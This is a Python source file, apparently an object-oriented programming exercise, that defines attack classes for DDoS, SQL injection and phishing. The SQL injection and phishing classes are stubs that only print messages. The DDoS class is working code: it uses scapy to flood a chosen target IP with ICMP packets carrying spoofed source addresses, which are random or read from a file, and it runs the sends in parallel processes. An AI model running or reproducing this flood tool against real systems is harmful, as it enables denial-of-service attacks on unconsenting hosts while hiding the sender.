import sys
import random
import logging
from abc import ABC, abstractmethod
from scapy.all import IP, ICMP, send
import configips
import multiprocessing
import time
from enum import Enum

# Configuración de logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Definición de Enum para los tipos de ataque
class AttackType(Enum):
    DDoS = "DDoS"
    SQL_INJECTION = "SQL Injection"
    PHISHING = "Phishing"

# 
class Attack(ABC):
    def __init__(self, attack_type: AttackType, targets: list):
        self.__attack_type = attack_type
        self.__targets = targets
        self.status = "pending"

    def get_attack_type(self):
        return self.__attack_type

    def set_attack_type(self, attack_type):
        if isinstance(attack_type, AttackType):
            self.__attack_type = attack_type

    def get_targets(self):
        return self.__targets

    def set_targets(self, targets):
        if isinstance(targets, list):
            self.__targets = targets

    @abstractmethod
    def start(self):
        pass

    @abstractmethod
    def pause(self):
        pass

    @abstractmethod
    def stop(self):
        pass


class DDoSAttack(Attack):
    def __init__(self, dst_ip: str, n_ips: int, n_msg: int, interface: str, orig_type: str, threads: int):
        super().__init__(AttackType.DDoS, [dst_ip])
        self.dst_ip = dst_ip
        self.n_ips = n_ips
        self.n_msg = n_msg
        self.interface = interface
        self.orig_type = orig_type
        self.threads = threads
        self.ips = []

        if self.orig_type == "2":
            self.get_random_ips()
        else:
            self.get_text_total_ips()

    def get_random_ips(self):
        for _ in range(int(self.n_ips)):
            ip_gen = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
            self.ips.append(ip_gen)

    def get_text_total_ips(self):
        try:
            with open("ips.txt") as f:
                f_ips = [line.strip() for line in f]
                if len(f_ips) == 0:
                    print("[-] Error: ips.txt is empty.")
                    sys.exit(0)
                self.ips = f_ips * (int(self.n_ips) // len(f_ips)) + f_ips[:int(self.n_ips) % len(f_ips)]
        except FileNotFoundError:
            print("[-] Error: ips.txt not found.")
            sys.exit(0)

    def send_packet_flood(self, origin_ip):
        load = "suchaload" * 162  # Carga útil predeterminada
        send((IP(dst=self.dst_ip, src=origin_ip) / ICMP() / load) * int(self.n_msg), iface=self.interface, verbose=False)

    def start(self):
        self.status = "running"
        print(f"Iniciando ataque DDoS en {self.dst_ip} con {self.n_ips} IPs a una tasa de {self.n_msg} mensajes por IP.")
        
        # Enviar paquetes en hilos
        t0 = time.time()
        p = multiprocessing.Pool(self.threads)
        p.map(func=self.send_packet_flood, iterable=self.ips)
        p.close()

        total_s = float(time.time() - t0)
        total_p = int(self.n_ips) * int(self.n_msg)
        ratio = float(total_p) / float(total_s)
        print(f"\nTotal: \nTiempo:\t{int(total_s)} segundos")
        print(f"Paquetes:\t{total_p} \nVelocidad:\t{int(ratio)} p/s")

    def pause(self):
        self.status = "paused"
        print("Ataque DDoS pausado.")

    def stop(self):
        self.status = "stopped"
        print("Ataque DDoS detenido.")

# Subclase para un ataque de SQL Injection
class SQLInjectionAttack(Attack):
    def __init__(self, target_url: str, payload: str):
        super().__init__(AttackType.SQL_INJECTION, [target_url])
        self.__target_url = target_url
        self.__payload = payload

    def start(self):
        self.status = "running"
        print(f"Iniciando SQL Injection en {self.__target_url} con el payload: {self.__payload}")

    def pause(self):
        self.status = "paused"
        print("Ataque SQL Injection pausado.")

    def stop(self):
        self.status = "stopped"
        print("Ataque SQL Injection detenido.")

# Subclase para un ataque de Phishing
class PhishingAttack(Attack):
    def __init__(self, target_emails: list, template: str):
        super().__init__(AttackType.PHISHING, target_emails)
        self.__target_emails = target_emails
        self.__template = template

    def start(self):
        self.status = "running"
        print(f"Enviando correos de phishing a: {', '.join(self.__target_emails)} con la plantilla: {self.__template}")

    def pause(self):
        self.status = "paused"
        print("Ataque de phishing pausado.")

    def stop(self):
        self.status = "stopped"
        print("Ataque de phishing detenido.")
